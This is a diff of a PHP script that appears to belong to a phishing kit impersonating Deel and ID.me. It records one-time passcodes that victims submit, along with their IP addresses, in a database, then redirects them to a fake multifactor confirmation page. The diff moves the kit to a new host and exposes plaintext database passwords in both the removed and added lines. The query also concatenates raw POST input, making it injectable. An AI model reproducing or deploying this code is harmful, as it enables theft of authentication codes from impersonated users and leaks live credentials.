@@ -1,5 +1,5 @@
 <?php
-    $db = pg_connect("host=dpg-cqfi9f5ds78s73buv0b0-a port=5432 dbname=deel user=deel_user password=N1qJ1zxkCQ12hOoFdgVMKDPVIOnOGJSV");
+    $db = pg_connect("host=dpg-cqh3vvks1f4s73bivarg-a port=5432 dbname=deelhr user=deelhr_user password=6y1qb08i2jNrgPtQ6nBSDPNjgCq3e9lm");
 
     $userotp=$_POST['userotp'];
 
@@ -7,7 +7,7 @@ if ($_SERVER["REQUEST_METHOD"]=="POST"){
     $query = "INSERT INTO otp (userotp,time,ip) VALUES ('$_POST[userotp]',NOW(),'$_POST[ip]')";
     $result = pg_query($query);
 
- header("Location:https://deel.onrender.com/Deel.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
+ header("Location:https://deelhr.onrender.com/Deel.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
 exit;
 }
 ?>
